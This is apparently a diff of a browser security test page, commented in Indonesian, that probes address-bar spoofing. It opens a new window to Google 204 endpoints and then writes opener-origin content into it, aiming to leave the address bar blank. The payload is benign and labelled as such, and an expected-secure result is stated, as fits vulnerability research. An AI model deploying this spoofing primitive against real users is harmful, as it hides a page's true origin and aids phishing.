@@ -1,26 +1,40 @@
-<!-- 15 | ⭐ F1 · navigasi yang berakhir jadi UNDUHAN — bar wajib mundur, apakah selalu? | [1-CLICK]
-     Ini bentuk kedua dari "navigasi dibatalkan setelah bar berganti", dan yang paling
-     mudah ditemukan di dunia nyata.
-     MEKANISME  kalau respons membawa Content-Disposition: attachment (atau tipe yang tak bisa
-     dirender), browser MEMBATALKAN navigasi dan menyerahkannya ke pengelola unduhan.
-     Dokumen tujuan tidak pernah lahir - halaman lama tetap di layar. Tapi omnibox sudah
-     sempat menulis URL tujuan di titik commit, jadi ia harus MUNDUR lagi.
-     Jalur mundur itu kode terpisah dari jalur maju, dan jauh lebih jarang diuji.
-     KENAPA INI YANG PALING BERNILAI  kamu tidak perlu mengendalikan situs korban. Kamu hanya
-     perlu SATU URL di origin korban yang menghasilkan unduhan - PDF, zip, lampiran, export CSV.
-     Situs besar penuh URL semacam itu. Kalau bar tersangkut di sana, bar menulis korban
-     sementara layar menampilkan halamanmu.
-     ETIKA  ini GET biasa ke berkas publik, satu kali - sama seperti mengklik tautan unduh.
-     Jangan arahkan ke host yang tidak boleh kamu sentuh. Batalkan unduhannya setelah diuji.
-     EXPECTED-SECURE  bar kembali ke halaman ini begitu navigasi dibatalkan. -->
-<h2 style="font:20px system-ui">HALAMAN PENYERANG</h2>
-<input id=t value="probe.bin" style="width:340px;font:13px monospace">
-<button onclick="location.href=t.value.trim()">Navigasi ke URL unduhan</button>
+<!-- 15 | ⭐⭐⭐ BAR KOSONG via 204 — abort bersih di jendela tanpa riwayat | [1-CLICK]
+     INI PRIMITIF YANG BENAR. Versi sebelumnya di file ini memakai port mati; itu KELIRU.
+     Port mati memberi HANG (bar menahan URL) atau halaman ERROR (bar jujur). Dua-duanya bukan kosong.
+     Yang mengosongkan bar adalah ABORT BERSIH: navigasi dimulai, bar sudah menulis tujuan,
+     lalu server menjawab 204 No Content -> tidak ada dokumen untuk di-commit, dan TIDAK ADA
+     halaman error. Bar harus mundur. Di jendela yang BARU DIBUAT tidak ada entri riwayat
+     untuk dimundurkan -> hasilnya KOSONG, bukan about:blank.
+     TIGA SYARAT, ketiganya wajib (hilang satu = tidak terjadi):
+       1. JENDELA BARU (window.open) — bukan tab yang sudah ada. Tab lama punya URL utk kembali.
+       2. respons 204 dari host SUNGGUHAN — bukan port mati, bukan DNS gagal.
+       3. document.write ke initial empty document yang masih MEWARISI origin opener.
+     Terverifikasi 204: www.google.com/csi · /gen_204 · /generate_204 (lihat 204-endpoints.txt)
+     PREDIKAT  address bar jendela baru KOSONG (tak ada teks apa pun) + DOM ini terlukis penuh.
+     EXPECTED-SECURE  bar menulis about:blank, atau URL yang gagal, atau origin opener.
+     BENIGN: nol form, nol input password, nol peniruan merek. Panel mencetak origin asli. -->
+<button onclick="go()">Run 15</button>
+<select id=u style="font:13px monospace">
+  <option>https://www.google.com/gen_204</option>
+  <option>https://www.google.com/csi</option>
+  <option>https://www.google.com/generate_204</option>
+</select>
 <pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
-g.textContent = 'REAL ORIGIN: ' + location.href +
-  '\n\nprobe.bin = berkas kecil di repo ini (kontrol same-origin).' +
-  '\nLalu ganti dengan URL unduhan di origin lain, mis. sebuah .pdf dgn attachment.' +
-  '\n\nSetelah unduhan muncul: BACA OMNIBOX. Menulis URL tujuan atau kembali ke sini?' +
-  '\nTersangkut di URL tujuan = temuan penuh.';
+g.textContent = 'REAL ORIGIN: ' + location.href + '\n\nKlik, lalu BACA ADDRESS BAR jendela baru.';
+function go() {
+  var w = window.open(u.value, '_blank', 'width=520,height=380');
+  if (!w) { g.textContent = 'popup diblokir — izinkan popup untuk situs ini.'; return; }
+  setTimeout(function () {
+    try {
+      w.document.write('<div style="font:15px system-ui;padding:18px">' +
+        '<b>DOM ini ditulis oleh ' + location.origin + '</b>' +
+        '<p style="font:12px monospace">Address bar jendela ini menulis apa? Kosong = predikat terpenuhi.</p></div>');
+      w.document.close();
+    } catch (e) { g.textContent += '\nwrite ditolak: ' + e.name + ' (navigasi ternyata COMMIT)'; }
+  }, 2400);
+  g.textContent = 'REAL ORIGIN: ' + location.origin + '\ntujuan: ' + u.value +
+    '\n\nBACA ADDRESS BAR jendela baru:\n  kosong total   = TEMUAN (screenshot sekarang)\n' +
+    '  about:blank    = aman\n  URL tujuan     = navigasi tidak abort, ganti endpoint';
+}
 </script>
